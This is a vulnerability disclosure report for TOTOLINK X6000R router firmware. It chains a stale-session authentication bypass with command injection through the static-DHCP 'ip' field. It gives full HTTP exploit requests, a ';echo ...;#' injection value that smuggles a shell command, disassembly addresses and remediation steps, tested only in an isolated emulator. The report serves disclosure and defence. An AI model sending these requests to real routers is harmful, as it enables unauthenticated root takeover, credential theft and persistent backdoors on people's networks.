# Report 01 — Unauthenticated Remote Command Execution via Stale-Session Takeover + Static-DHCP Injection

| Field | Details |
|-------|---------|
| Vendor | TOTOLINK (Zioncom) |
| Product | X6000R |
| Firmware | V9.4.0cu.1360_B20241207 |
| SHA-256 | `32f11a6f07b1d8e8598ae1a028d9dca58096a7d3b8e0677f5285db3672e051b6` |
| Binary | `/usr/sbin/shttpd` + `/lib/cste_modules/liboperations.so` |
| CWE | CWE-288 (Auth Bypass) + CWE-78 (OS Command Injection) |
| Auth required | None (after stale session >300s) |
| CVSS 3.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — **9.8 CRITICAL** (with stale-session condition) |
| Firmware download | https://www.totolink.tw/support_view/X6000R |

---

## Summary

TOTOLINK X6000R V9.4.0cu.1360_B20241207 contains two vulnerabilities that chain to unauthenticated remote command execution:

1. **Stale-session auth bypass:** The shared auth gate in `shttpd` accepts a request from a different peer IP when an existing session has been idle for over 300 seconds, granting full unauthenticated access to all protected handlers.
2. **Static-DHCP command injection:** The `setStaticDhcpRules` handler (auth-flag 1, normally protected) passes the user-supplied `ip` parameter unsanitized through `arp_bind` into `system()`.

An attacker on the management LAN combines these: wait for a session to go stale → take over without credentials → inject OS commands through the DHCP IP field → execute as root.

---

## Root Cause

### Vulnerability 1 — Stale-session auth bypass

The shared authentication gate (`shttpd:0x0040b940`) invokes a helper (`shttpd:0x0040b784`) for auth-flag-1 handlers. The helper reads `login_timestamp` from `/tmp/cste/temp_status`. If `current_uptime - login_timestamp > 300`, the branch at `0x0040b83c–0x0040b878` clears the IP mismatch and `0x0040ba50–0x0040ba5c` saves the new peer IP as the active session. No token, cookie, or credential is checked.

```
shttpd:0x0040b940  auth gate entry
shttpd:0x0040b784  stale session helper
  0x0040b7c4       read login_timestamp from /tmp/cste/temp_status
  0x0040b808       compare: (uptime - login_timestamp) > 300?
  0x0040b83c–0x0040b878  YES → clear IP mismatch
  0x0040ba50–0x0040ba5c  save attacker IP as new session peer
  → NO token/cookie/password check — time condition alone grants access
```

### Vulnerability 2 — Static-DHCP IP command injection

The `setStaticDhcpRules` callback (`shttpd:0x00423f6c`, dispatcher `0x0044a8f8`, auth-flag 1) validates `mac` but does NOT validate or shell-escape `ip`. The stored `ip` flows through:

```
setStaticDhcpRules (shttpd:0x00423f6c, auth-flag 1)
  → reads "mac" → validates MAC format ✅
  → reads "ip"  → NO validation ❌ → stores to UCI as-is
  → triggers DHCP apply:
     CsRealReloadDhcp (liboperations.so:0x27cc)
     → arp_bind (liboperations.so:0x24f8)
     → snprintf(cmd, "arp -s %s %s", ip, mac)  at 0x2770–0x2780
     → CsteSystem(cmd)  at 0x27a0–0x27a4
     → system(cmd)
```

Input `ip = ";echo PWNED>/tmp/marker;#"` produces:
```
arp -s ;echo PWNED>/tmp/marker;# 02:11:22:33:44:55
```
`echo PWNED>/tmp/marker` executes as a separate shell command.

### Chain

The stale-session bypass grants access to auth-flag-1 `setStaticDhcpRules`, which executes the injected command as root.

---

## PoC

### Environment

- QEMU aarch64 user-mode + PRoot in rootless user/network/PID namespaces
- Network: loopback only (192.168.1.1–.4 on lo), no default route, no external access
- Synthetic admin session at `192.168.1.3`, attacker at `192.168.1.2`

### Step 1 — Legitimate admin login (creates session to hijack)

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/json
X-Forwarded-For: 192.168.1.3

{"topicurl":"loginAuth","username":"admin","password":"<md5_hash>"}
```
Response: `{"errcode":"0"}` — session established at IP `.3`.

### Step 2 — Wait >300 seconds (session becomes stale)

Verified both:
- **Staged:** set `login_timestamp = uptime - 600` in `/tmp/cste/temp_status`
- **Wall-clock:** waited 305 seconds real time in separate run

### Step 3 — Attacker takes over stale session (NO token, NO cookie)

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/json
X-Forwarded-For: 192.168.1.2

{"topicurl":"setUploadSetting","file_name":"/etc/config/canary","content_length":"0"}
```
Response: `{"errcode":"0"}` — canary deleted, attacker `.2` owns the session.

### Step 4 — Inject command through static DHCP (still NO token)

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/json
X-Forwarded-For: 192.168.1.2

{"topicurl":"setStaticDhcpRules","enable":"1","list":[{"mac":"02:11:22:33:44:55","ip":";echo F09_F10_CHAIN_OK >/tmp/x6000r_authenticated_arp_marker;#","comment":"test"}]}
```

### Step 5 — Verify command execution

```
$ cat /tmp/x6000r_authenticated_arp_marker
F09_F10_CHAIN_OK
```

QEMU `apply.log`:
```
execve("/bin/sh", {"sh", "-c", "arp -s ;echo F09_F10_CHAIN_OK >/tmp/x6000r_authenticated_arp_marker;# 02:11:22:33:44:55", ...})
→ open("/tmp/x6000r_authenticated_arp_marker", O_WRONLY|O_CREAT|O_TRUNC) = success
```

### Negative controls

| # | Test | Source IP | Token/Cookie | Session state | Expected | Actual | Pass |
|---|------|-----------|-------------|---------------|----------|--------|------|
| 1 | Clean start, no session exists | .2 | None | No session | Reject | `errcode=-4` Login timeout | ✅ |
| 2 | Fresh session, admin just logged in | .2 | None | .3 logged in <300s ago | Reject | `errcode=-3` Other user online | ✅ |
| 3 | **Stale session, >300s old** | **.2** | **None** | **.3 stale >300s** | — | **`errcode=0` → session hijacked** | ⚠️ BUG |
| 4 | After takeover, third party | .4 | None | .2 now owns session | Reject | Rejected | ✅ |
| 5 | Wall-clock natural aging (305s) | .2 | None | .3 naturally stale | — | **`errcode=0` → session hijacked** | ⚠️ BUG |

### Oracle scripts

| File | Purpose |
|------|---------|
| `runs/run_auth_to_staticdhcp_chain_1.sh` | Runner (isolation setup + QEMU launch) |
| `runs/auth_to_staticdhcp_chain_1.py` | Driver (all 5 steps + controls) |
| `runtime-f09-f10-chain-20261002T022259Z-2198739/` | Staged run artifacts |
| `runtime-f09-f10-chain-20261002T022636Z-2201093/` | Wall-clock run artifacts |

---

## Impact

An unauthenticated attacker on the management LAN can execute arbitrary OS commands as root after an existing admin session has been idle for over 300 seconds. On a deployed device, this could lead to:

- Full device compromise
- Credential theft (Wi-Fi keys, VPN accounts, admin password)
- Persistent backdoor installation (modify boot scripts, add SSH keys)
- Lateral network movement (pivot to LAN devices)
- Traffic interception and manipulation

**Conditions:** management interface reachability + existing session stale >300s.

---

## Validation

| Item | Status |
|------|--------|
| Environment | QEMU aarch64 user-mode + PRoot, rootless namespaces |
| Network isolation | Loopback only (192.168.1.1–.4 on lo), no default route |
| Runs | **2 independent runs:** staged timestamp + natural 305s wall-clock |
| Controls | 5 negative controls (see table above) |
| Data | Synthetic credentials + harmless echo marker |
| Physical device | **NOT tested** |
| Internet router | **NOT accessed** |
| Evidence artifacts | 2 runtime dirs + 2 log dirs preserved |

---

## Remediation

1. **Remove stale-session IP-takeover fallback** — require re-authentication after timeout, do not transfer session to a new IP
2. **Validate `ip` parameter** in `setStaticDhcpRules` against strict IPv4 format (`^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`) before storing
3. **Shell-escape** all user-supplied values before passing to `CsteSystem()`/`system()`
4. Replace `system()` shell string with `execv()` argument array

## Credit
- Please credit: doanmanhducz (Dokja Doan)
